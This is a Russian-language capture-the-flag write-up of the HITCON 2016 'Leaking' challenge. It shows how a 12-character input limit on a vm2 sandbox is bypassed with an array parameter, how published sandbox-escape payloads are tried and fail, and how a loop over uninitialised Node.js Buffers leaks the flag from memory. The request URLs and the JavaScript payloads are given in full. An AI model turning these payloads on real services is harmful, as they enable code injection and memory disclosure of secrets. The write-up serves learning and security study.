## LEAKING +200 HITCON 2016 Web  (Разбор получения флага)

Условие задачи:

```
Category: reverse Points: 200 Solves: Description:

Remote Code Execution! http://52.198.115.130:3000/
```

Это пожалуй самая интересная задача, которую я не решил из за отсутствия времени, потому я посмотрел как это сделали другие участники этого замечательного CTF. 

Вот исходный код, который отображается, при переходе по ссылке в теле задания:

```javascript
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {VM} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function (req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";");
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function () {
    console.log("listening on port 3000!");
});
```

Видим, что тут используется VM2 и исполние кода в песочнице, мда, не зря эту задачу Orange добавил. Как то значит можно выйти за пределы песочницы :). Сразу вспомнились баги в браузере IE с VBScript когда стала возможным при помощи стрей стека и манипуляций с типами установить флаг определящий безопасное использование инструкций в браузере в состояние разрешающее все что было можно в обычном VBScript коде вне браузера. Но тут Node.js и наверняка другая история. 

Первое что бросается в глаза это ограничение длины данных, она не может превышать 12 символов. Хм но в 12 символов надо еще постараться что то такое впихнуть, короткое, чтобы прошло (в голове сразу начали крутиться мысли с манипуляциями в передаче параметров строки). Так вот, раз это Node.js там JavaScript, а мы знаем, что массив в JS является исполняемым элементов, потому в JSON передача [] может выполнить код определенный записанный в нем. Вот к примеру, мы можем выполнить такой код `[console.log("Hello!")]` и получим в консоле вывод `Hello!` Так вот вернемся к нашим параметрам в строке. Для передачи данных серверу нужно использовать параметр data - это видно из следующей строки:

```javascript
if (req.query.data && req.query.data.length <= 12) {
```

Так вот чтобы преодалеть это ограничение нам нужно воспользоваться этим моментом и не страшно что наш код будет внутри массива, он выполнится все равно, но мы при этом преодалеваем ограничение `req.query.data.length <= 12` так как длина нашего массива будет 1 ибо мы используем лишь один элемент массива и тут уже будет браться длина массива. Проверим это утрверждение, отправляем следующие данные:

```
http://localhost:3000/?data[]=%22Very%20very%20looooooooooog%20striiiiiiiiinnnnnggggg!!!!%20AAAAAAAAAAAAAAAAAAAAAAAAA%22
```

Ха ха! Работает! И при этом получем вывод:

```
eval ->Very very looooooooooog striiiiiiiiinnnnnggggg!!!! AAAAAAAAAAAAAAAAAAAAAAAAA
```

Ну еще для успокоения можно выполнить что то кодом. К примеру:

```javascript
(function a(){var a="";for(var i=0;i<=10;i++){a+="test " + i + "\n";}return a;})()
```

Отправяем в браузере такой вот запрос:

```
http://localhost:3000/?data[]=%28function%20a%28%29{var%20a%3D%22%22%3Bfor%28var%20i%3D0%3Bi%3C%3D10%3Bi%2B%2B%29{a%2B%3D%22test%20%22%20%2B%20i%20%2B%20%22\n%22%3B}return%20a%3B}%29%28%29
```

Получаем вывод:

```
eval ->test 0
test 1
test 2
test 3
test 4
test 5
test 6
test 7
test 8
test 9
test 10
```

Так так :) Значит все работает и теперь мы можем внедрять код любой длинны не преживая о проверке в 12 символов. Это нас не останавливает теперь.

Остается понять как же быть дальше. В итоге после гугления, выделяю несколько ссылок, с информацией о багах и обходах песочницы в VM2 (https://github.com/patriksimek/vm2/issues/32). 

Пробуем применить подходы которые описаны в этом тикете. К примеру попробуем отправить следующую строку:

```javascript
global.constructor.constructor('return this')().constructor.constructor('return process')()
```

В итоге получается следующий запрос:

```
http://localhost:3000/?data[]=global.constructor.constructor%28%27return%20this%27%29%28%29.constructor.constructor%28%27return%20process%27%29%28%29
```

И ответ:

```
ReferenceError: process is not defined
   at eval (eval at <anonymous> (vm.js:1:61), <anonymous>:2:8)
   at vm.js:1:90
   at ContextifyScript.Script.runInContext (vm.js:35:29)
   at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
   at /root/HITCON/server.js:21:33
   at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
   at next (/root/HITCON/node_modules/express/lib/router/route.js:131:13)
   at Route.dispatch (/root/HITCON/node_modules/express/lib/router/route.js:112:3)
   at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
   at /root/HITCON/node_modules/express/lib/router/index.js:277:22 
```

Хм не работает. Пробуем еще что нить в этом смысле:

```javascript
'use strict';
const {VM} = require('vm2');
const vm = new VM();
vm.run(`
    /*function getParent(o) {
        return o.constructor.constructor('return this')();
    }*/
     
    function getParent(o) {
        return o.__proto__.constructor.constructor('return this')();
    }

    function exploit(o) {
        const foreignFunction = o.constructor.constructor;
        const process = foreignFunction('return process')();
        const require = process.mainModule.require;
        const console = require('console');
        const fs = require('fs');

        console.log('\u{1F60E} ', fs.statSync('.'), '\u{1F60E}');

        return o;
    }

    (function () {
        exploit(getParent(getParent(arguments.callee.caller)));
    })();
`);
```

Но получал что то подобие:

```
/root/HITCON/node_modules/vm2/lib/main.js:125
			throw this._internal.Decontextify.value(e);
			^
TypeError: Cannot read property 'constructor' of null
    at getParent (vm.js:3:17)
    at vm.js:19:27
    at vm.js:20:7
    at ContextifyScript.Script.runInContext (vm.js:35:29)
    at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
    at Object.<anonymous> (/root/HITCON/exploit.js:7:4)
    at Module._compile (module.js:556:32)
    at Object.Module._extensions..js (module.js:565:10)
    at Module.load (module.js:473:32)
    at tryModuleLoad (module.js:432:12)
```

и 

```
/root/HITCON/node_modules/vm2/lib/main.js:125
			throw this._internal.Decontextify.value(e);
			^
TypeError: Cannot read property '__proto__' of null
    at getParent (vm.js:7:17)
    at vm.js:23:27
    at vm.js:24:7
    at ContextifyScript.Script.runInContext (vm.js:35:29)
    at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
    at Object.<anonymous> (/root/HITCON/exploit.js:7:4)
    at Module._compile (module.js:556:32)
    at Object.Module._extensions..js (module.js:565:10)
    at Module.load (module.js:473:32)
    at tryModuleLoad (module.js:432:12)
```

В общем не получается обойти сэндбокс такмими методами не получится. Тогда нужно искать дальше. В итоге после некоторого гугления натыкаешься на ссылки:

* https://github.com/nodejs/node/issues/4660 
* https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md

Получается что Buffer в Node.js ликает информацию по такому же принципу как HeartBleed. А все из-за того что в результате создания нового объекта Buffer в Node.js память выделяемая под него не обнуляется и не заполняется нулями, чтобы исключить выдачу информации, которая ранее содержалась в этой области памяти. Таким образом значит можно попытаться какое то кол-во раз выделять буфер одного и того же размера и при этом смотреть наличие в нем строки `hitcon{`  это начало флага, для этого CTF.

Отправляем следующий запрос в браузере:

```javascript
localhost:3000/?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(1024)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
```

И получаем в ответ, после нескольких отправок посредством Enter в строке браузера: 

```
eval ->���I:����<���ARIzxmu���0/F����(b}����u~h3��� w'���� {'����bG�8ueval��H90/F������������`l}���Xw'������������6[B
u��0@F�������������������������������8x'������EH��������0/F����8b}������������Hw'�������(��������0@F���������������������8x'����������8x'����q'����(w'��������������������m}����������u�������H	XF����q'����Pw'������������������H9pc��������P5F����������_������������������������y'����������(������������|'����flag_NlxPt3SGbmVO7n6yNbdUX6ZK8nixjChwEWJ3SwPnzPXBsjs8ujiEPkpll0NGi4eG}�0/F����0Ly����y'����y'����E����5Hl5u(:eval����0/F����8Ly���������y'�����������6[B
�i�arguments���i��0/F����@Ly���������8y'����	�������
WuI:xm.result�0/F����HLy����������xy'�������/���G?����0@F����������������������Py'����I���hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}&����0/F����PLy����IF����hz'����B�������*J����prototypez'����0/F����XLy����������`z'����
```

И что мы видим! А видим мы среди прочего мусора содеримое флага! 

````
hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}
````

При этом я заметил что маленькое значение буфера приводит к большему кол-ву отправок, чтобы добиться результата. Так что размер буффера нужно подбирать самому. 

При этом видно различные результаты и кол-во запросов тоже разнится:

Если используем буффер 2048 получаем вывод:

![VirtualBox_Kali2016.2_16_10_2016_21_30_45](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hitcon_quals/leaking/imgs/VirtualBox_Kali2016.2_16_10_2016_21_30_45.png)

При использовании буффера в 1024 байта получаем:

![VirtualBox_Kali2016.2_16_10_2016_21_09_42](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hitcon_quals/leaking/imgs/VirtualBox_Kali2016.2_16_10_2016_21_09_42.png)

При использовании буфера в 200 байт как приведено в ссылке, приходится не один раз отправить запрос прежде чем получить вывод флага. 

![VirtualBox_Kali2016.2_16_10_2016_21_38_45](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hitcon_quals/leaking/imgs/VirtualBox_Kali2016.2_16_10_2016_21_38_45.png)

При этом если часто отправлять запросы то VM может выдавать ошибки timeout

```
Error: Script execution timed out.
    at Error (native)
    at ContextifyScript.Script.runInContext (vm.js:35:29)
    at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
    at /root/HITCON/server.js:21:33
    at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
    at next (/root/HITCON/node_modules/express/lib/router/route.js:131:13)
    at Route.dispatch (/root/HITCON/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
    at /root/HITCON/node_modules/express/lib/router/index.js:277:22
```

Огромное спасибо за информацию которую я почерпнул из следующих врайтапов:

* http://lorexxar.cn/2016/10/10/hitcon2016/
* http://ctfs.ghost.io/hello-hitcon-2016-ctf/

Автор **n0z3r0** 